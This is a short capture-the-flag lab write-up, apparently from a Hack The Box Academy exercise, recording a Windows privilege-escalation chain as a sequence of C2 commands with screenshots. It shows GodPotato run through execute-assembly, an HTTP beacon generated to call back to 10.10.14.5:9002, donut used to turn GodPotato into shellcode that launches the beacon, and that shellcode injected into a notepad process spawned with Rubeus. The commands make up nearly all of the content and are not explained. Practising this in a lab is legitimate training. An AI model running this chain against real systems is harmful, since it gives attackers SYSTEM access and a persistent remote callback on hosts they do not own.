# [Privilege Escalation](Privilege%20Escalation.md)
### Escalate your privileges and submit the contents of the web01_root.txt flag located on the Administrator's Desktop

```sh
execute-assembly /home/htb-ac-1951749/GodPotato-NET4.exe -cmd "whoami"
```

![](Screenshot%202026-11-05%20at%2014.40.34.png)

```sh
generate beacon --http 10.10.14.5:9002 --skip-symbols -N http-beacon

upload http-beacon.exe
```

![](Screenshot%202026-11-05%20at%2015.29.53.png)

```sh
./donut -i GodPotato-NET4.exe -a 2 -b 2 -p '-cmd c:\temp\http-beacon.exe' -o /home/htb-ac-1951749/godpotato.bin
```

![](Screenshot%202026-11-05%20at%2015.33.11.png)

```sh
execute-assembly /tmp/Rubeus.exe createnetonly /program:C:\\windows\\system32\\notepad.exe
```

![](Screenshot%202026-11-05%20at%2015.35.00.png)

```sh
execute-shellcode -p 4056 /home/htb-ac-1951749/godpotato.bin

ps -e notepad
```

![](Screenshot%202026-11-05%20at%2015.36.47.png)

![](Screenshot%202026-11-05%20at%2015.37.27.png)